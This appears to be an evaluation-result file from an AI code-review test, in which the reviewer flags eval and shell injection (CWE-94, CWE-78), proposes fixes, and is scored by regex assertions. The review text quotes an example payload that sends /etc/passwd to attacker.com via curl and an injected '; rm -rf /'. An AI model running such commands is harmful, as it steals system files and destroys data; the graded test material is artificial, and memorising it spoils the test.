@@ -1,0 +1,47 @@
+{
+  "agent": "code-reviewer",
+  "case_id": "eval-exec-injection",
+  "model": "sonnet",
+  "prompt_hash": "c08928400e09e2736360d80d3a8a5047994e39c4efcf17c07fc0c6d3cd8661da",
+  "output": "## Verdict: **BLOCK**\n\nTwo critical security findings:\n\n---\n\n### Finding 1 — **BLOCKING** — Arbitrary Code Execution via `eval`\n\n**CWE-94 (Code Injection)**\n\n```javascript\nconst payload = eval('(' + req.body + ')');\n```\n\nAny request body is executed as JavaScript in the server process. An attacker sends `process.exit(1)` or `require('child_process').execSync('curl attacker.com/exfil?d='+require('fs').readFileSync('/etc/passwd'))` as the body.\n\n**Fix:** Replace with `JSON.parse(req.body)`.\n\n---\n\n### Finding 2 — **BLOCKING** — OS Command Injection\n\n**CWE-78 (OS Command Injection)**\n\n```javascript\nexec(`deploy.sh ${payload.target}`);\n```\n\nEven after fixing `eval`, attacker-controlled `payload.target` is interpolated directly into a shell command. Input `; rm -rf /` executes arbitrary commands.\n\n**Fix:** Use `execFile` with an argument array (no shell interpolation) and validate `target` against an allowlist:\n\n```javascript\nconst { execFile } = require('child_process');\nconst ALLOWED_TARGETS = new Set(['staging', 'production']);\nif (!ALLOWED_TARGETS.has(payload.target)) throw new Error('invalid target');\nexecFile('./deploy.sh', [payload.target], callback);\n```",
+  "assertion_results": [
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?m)^\\s*BLOCK\\b"
+      },
+      "passed": false,
+      "reason": "output does not match regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-94"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-78|command injection"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)eval|exec"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    }
+  ],
+  "status": "agent_failure",
+  "passed": false,
+  "input_tokens": 3,
+  "output_tokens": 524,
+  "cost_usd": 0.047939999999999997,
+  "duration_ms": 11199
+}
